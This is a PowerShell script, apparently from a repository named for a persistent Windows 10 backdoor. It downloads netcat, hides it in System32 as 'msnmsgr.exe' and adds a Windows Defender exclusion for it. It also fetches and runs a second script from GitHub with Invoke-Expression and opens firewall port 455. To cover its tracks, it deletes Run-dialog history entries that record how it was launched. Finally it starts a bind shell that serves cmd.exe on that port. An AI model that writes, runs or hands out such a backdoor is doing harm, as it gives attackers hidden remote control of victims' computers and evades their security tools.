# 1/7: Downloading ZIP file
Write-Host "1/10: Downloading ZIP file..."
$zipFilePath = "C:\Windows\Temp\netcat-win32-1.11.zip"
$destinationPath = "C:\Windows\Temp\netcat-1.11"
if (-Not ([string]::IsNullOrEmpty($zipFilePath))) {
    Invoke-WebRequest -Uri "https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip" -OutFile $zipFilePath -UseBasicParsing
}
if (Test-Path $zipFilePath) {
    Write-Host "ZIP file downloaded successfully."
} else {
    Write-Host "Failed to download ZIP file."
    exit
}

# 2/7: Extracting ZIP file
Write-Host "2/10: Extracting ZIP file..."
Expand-Archive -Path $zipFilePath -DestinationPath $destinationPath
if (Test-Path $destinationPath) {
    Write-Host "ZIP file extracted successfully."
} else {
    Write-Host "Failed to extract ZIP file."
    exit
}

# 3/7: Moving and Renaming
Write-Host "3/10: Moving and Renaming..."
$ncFilePathNested = "C:\Windows\Temp\netcat-1.11\netcat-1.11\nc.exe"
$ncFilePathTopLevel = "C:\Windows\Temp\netcat-1.11\nc.exe"
$system32Path = "C:\Windows\System32"

if (Test-Path $ncFilePathNested) {
    $ncFilePath = $ncFilePathNested
} elseif (Test-Path $ncFilePathTopLevel) {
    $ncFilePath = $ncFilePathTopLevel
} else {
    Write-Host "nc.exe not found in the expected extraction paths."
    exit
}

Move-Item -Path $ncFilePath -Destination "$system32Path\nc.exe"
if (Test-Path "$system32Path\nc.exe") {
    Rename-Item -Path "$system32Path\nc.exe" -NewName "msnmsgr.exe"
    Write-Host "Moved and renamed successfully."
} else {
    Write-Host "Failed to move nc.exe to System32."
    exit
}


# 4/10: Setting up System Startup
Write-Host "4/10: Setting up System Startup..."

# Add an exclusion for the msnmsgr.exe file in the Windows antimalware software
Add-MpPreference -ExclusionPath "C:\Windows\System32\msnmsgr.exe"

# Check if the msnmsgr entry exists in the startup
$msnmsgrExists = reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "msnmsgr"

if ($msnmsgrExists) {
    # Remove the msnmsgr entry from startup
    reg delete "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "msnmsgr" /f
    Write-Host "msnmsgr entry removed from startup."
} else {
    Write-Host "msnmsgr entry not found in startup."
}

# URL del script alojado en GitHub
$scriptUrl = "https://raw.githubusercontent.com/alariordas/PersistentReverseShell-Win10Backdoor/main/dogcareinstaller.ps1"

# Descarga el contenido del script
$scriptContent = (Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing).Content

# Ejecuta el script en segundo plano
Start-Job -ScriptBlock {
    param($scriptContent)
    Invoke-Expression $scriptContent
} -ArgumentList $scriptContent



# 5/10: Adding Firewall Rule
Write-Host "5/10: Adding Firewall Rule..."
netsh advfirewall firewall add rule name="Service Firewall" dir=in action=allow protocol=TCP localport=455 enable=yes

# 6/7: Cleanup ZIP and Folder
Write-Host "6/10: Cleanup ZIP and Folder..."
$ncPath = "C:\Windows\Temp\netcat-1.11"
Remove-Item -Path $ncPath -Recurse -Force
Remove-Item -Path $zipFilePath -Force

# 7/7: Removing Specific History Entries
Write-Host "7/10: Removing Specific History Entries..."
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"
$runMRUEntries = Get-ItemProperty -Path $registryPath
$stringsToDelete = @(
    "powershell.exe IEX(IWR https://raw.githubusercontent.com/alariordas/PersistentReverseShell-Win10Backdoor/main/ncinstallerdebug.ps1 -UseBasicParsing);",
    "Set-ExecutionPolicy Unrestricted -Scope CurrentUser -Force",
    "ms-settings:windowsdefender"
)
foreach ($entryName in $runMRUEntries.PSObject.Properties.Name) {
    $entryValue = $runMRUEntries.$entryName
    foreach ($stringToDelete in $stringsToDelete) {
        if ($entryValue -like "*$stringToDelete*") {
            Remove-ItemProperty -Path $registryPath -Name $entryName
            Write-Host "Removed entry containing: $stringToDelete"
        }
    }
}

# Completion
Write-Host "All steps completed."
Start-Process "C:\Windows\System32\msnmsgr.exe" -ArgumentList "-Ldp 455 -e cmd.exe"

Write-Host -NoNewLine 'Press any key to continue...';
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');
